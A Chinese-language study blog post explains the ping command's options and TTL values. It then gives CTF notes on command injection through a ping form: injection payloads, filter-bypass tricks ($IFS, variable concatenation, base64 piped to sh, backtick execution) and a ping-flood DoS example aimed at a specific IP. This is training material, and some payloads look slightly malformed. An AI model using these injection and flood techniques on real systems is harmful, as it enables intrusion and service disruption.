# Ping


&gt; 参考文章：
&gt; [常用网络命令：ping命令的使用](https://blog.csdn.net/flyroc08/article/details/120103617?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169078581616800185856937%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169078581616800185856937&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-120103617-null-null.142^v91^koosearch_v1,239^v12^control2&amp;utm_term=ping&amp;spm=1018.2226.3001.4187)
&gt; [CTF——ping相关](https://blog.csdn.net/jklw4/article/details/108552103?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%E9%A2%98%E7%9B%AEPing&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-5-108552103.142^v91^koosearch_v1,239^v12^control2&amp;spm=1018.2226.3001.4187)

## 基本理论
1. Ping主要作用
（1）通常用来检测网络的连通情况和测试网络速度；
（2）根据域名得到相应主机的IP地址；
（3）根据ping返回的TTL值来判断对方所使用的操作系统及数据包经过路由器数量；
（4）进行网络扫描和攻击。
2. 用法
对于网络管理员和普通用户来说，我们通常用它来测试网络的连通情况，如果无法正常上网，ping命令是检测网络故障的基本工具。
ping命令的最简单用法是在命令提示符下输入：**ping 对方IP地址**，这样就可以测试本机和对方主机之间的网络连通情况了
3. 常见词汇
**bytes值**：表示通信过程中发送的数据包大小，单位是字节。
**time值**：表示响应时间，这个时间越小，说明你与对方通信的速度越快，延时越短。
**TTL值**：Time To Live,表示数据包再经过多少个路由器如果还不能到达就将被丢弃，这里可以通过Ping返回的TTL值大小，粗略地判断目标系统类型是Windows系列还是UNIX/Linux系列。
默认情况下，
**Linux系统的TTL最大值为64或255**，
**WindowsNT/2000/XP系统的TTL最大值为128**，
**UNIX主机的TTL最大值为255**。

## Ping的用法
![image-1690785864114](/upload/2023/07/image-1690785864114.png)

## 详细
1. **ping -t** 对方IP地址
可以不间断地ping指定IP地址的计算机，直到管理员使用Ctrl&#43;C中断，这样管理员可以通过比较多次通信后的统计数据来判断网络连接情况。
比如发送了多少数据包，接收到多少，丢失了多少，平均往返时间多少等等，以此来判断网络性能。

2. **ping -n** 数据包数量 对方IP地址
在默认情况下，一般执行一次ping命令只发送4个数据包，通过-n选项则可以自己定义发送的数据包个数，对衡量网络速度都很有帮助。
比如测试发送10个数据包的返回的平均时间为多少，最快时间为多少，最慢时间为多少。

例：
```
ping -n 10 47.93.187.142 	\\向47.93.187.142 这台主机发送10个数据包
```

3. ping -l 数据包大小 对方IP地址
在默认的情况下Windows的ping发送的数据包大小为**32字节**，**最大能发送65535字节**。当一次发送的数据包大于或等于65535字节时，将可能导致接收方计算机宕机。所以微软限制了这一数值。
这个参数配合其它参数功能非常强大，比如可以结合-t参数实施DOS攻击。
例：
```
ping -l 65500 -t 211.84.7.46	\\会连续对211.84.7.46这个地址执行ping命令，发送大量数据，导致对方网络拥塞或者主机宕机
```

4. 批量ping一个网段内的所有IP地址
对于一个网段IP地址众多，单个检测麻烦可以直接批量ping网段检测，哪个IP地址出了问题。
例：
```
for /L %D in (1,1,255) do ping 10.168.1.%D	\\依次ping从10.168.1.1到10.168.1.255的所有255个地址
```
*注：for /L %D in(1,1,255) do是批处理命令，其中的（1,1,255）表示变量%D的值从1开始，每次递增1，到255为止。就是检测网段10.168.1.1到10.168.1.255之间的所有的ip地址，每次递增1，直接到1到255这255个ip检测完为止。*

## 有关Ping的题目
1. 检测是否可以注入
```127.0.0.1;whoami```
但如果前段检测或者筛选，可能导致无法使用

2. 猜测尝试&#43;绕过**过滤**
（1）常见过滤字符：
```$```，```;```，```|```，```-```，```(```，```)```，```&#39;```[反引号],```||```，```&amp;&amp;```，```&amp;```，```{```，```}```，``` ```[空格]
（2）解决
```
127.0.0.1;a=&#34;l&#34;;b=&#34;s&#34;;c=$a$b;$c	\\(后面的部分可能会用引号包裹）
```
```
${IFS} or $IFS or $IFS$9
```

3. linux常用指令
（1）**文件搜索**
```find / -name file1 \\从 ‘/’ 开始进入根文件系统搜索文件和目录```
（2）**关于文件与目录**
```cd /home ```进入 ‘/ home’ 目录’
```cd … ```返回上一级目录
```pwd```显示工作路径
```ls```查看目录中的文件
```ls -F```查看目录中的文件
```ls -l ```显示文件和目录的详细资料
```ls -a```显示隐藏文件
（3）**查看文件内容**
```cat file1``` 从第一个字节开始正向查看文件的内容

4. 管道符
（1）```|```（就是**按位或**）
直接执行|后面的语句
（2）```||```（就是**逻辑或**）
如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句
（3）```&amp;```（就是**按位与**）
&amp;前面和后面命令都要执行，无论前面真假
（4）```&amp;&amp;```（就是**逻辑与**）
如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令
&#43;&#43;这里没试出来flag的话用cmd试一下&#43;&#43;
（5）```;```（linux下有的，**和&amp;一样的作用**）

5. 解题思路
（1）利用变量实现字符串拼接
例：
```
/?ip=127.0.0.1;b=ag;a=fl;cat$IFS$a$b.php
```
*注：a，b变量互换为了绕过字符串匹配*
（2）通过执行sh命令执行【bash不被过滤前提】
```
/?ip=127.0.01;echo$IFS$1Y2F0IGZsYWcuccGhw|base64$IFS$1-d|sh
```
*注：sh是linux中shell命令，bash相当于sh的升级版，是sh的一种形式*
（3）内联执行
```
/?ip=127.0.0.1;cat$IFS$9`ls`
```
*注：内联——将反引号的命令输出作为输入执行*

---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2023web-ping/  

